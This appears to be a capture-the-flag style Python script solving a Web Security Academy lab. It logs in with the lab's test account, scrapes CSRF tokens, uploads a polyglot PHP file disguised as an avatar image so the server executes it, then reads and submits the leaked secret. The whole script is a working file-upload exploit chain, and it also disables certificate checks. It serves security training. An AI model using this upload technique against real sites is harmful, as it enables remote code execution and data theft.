import requests
import re

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app_url = "https://0a9a0056048196248046f8450084000c.web-security-academy.net/"     #application url
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
exploit = ""

win_session = requests.session()
csrf_res = win_session.get(app_url+"/login",verify=False)

# way to find csrf token firsty regex will match the value name="csrf" value=" and then added a group (.*) where. means any character * menas 0 or more character sets
token_pattern = re.search(r'name="csrf" value="(.*)"',csrf_res.text)  
ftoken = token_pattern.group(1)
print("CSRF token for login is", ftoken)

win_data = {'username':'wiener','password':'peter','csrf':ftoken}
login_res = win_session.post(app_url+"/login",verify=False,data=win_data)
print(win_session.cookies.get_dict())

#start file upload

csrf2_res = win_session.get(app_url+"/my-account?id=wiener",verify=False)
token_pattern2 = re.search(r'name="csrf" value="(.*)"',csrf2_res.text)  
ftoken2 = token_pattern2.group(1)
print("CSRF token for file upload is", ftoken2)

upload_data = {'user':'wiener','csrf':ftoken2}
files = {'avatar':('abc.php',open('polyglot.php','rb'),'')}
upload_res = win_session.post(app_url+"/my-account/avatar",verify=False,files=files,data=upload_data)
print(upload_res.text)

#fetch file content
exp_res = win_session.get(app_url+"/files/avatars/abc.php",verify=False)
token_pattern2 = re.search(r'START.(.*).END',exp_res.text)  
answer = token_pattern2.group(1)

ans_data = {'answer':answer}
ans_res = win_session.post(app_url+"/submitSolution",verify=False,data=ans_data)
print(ans_res.text)
 
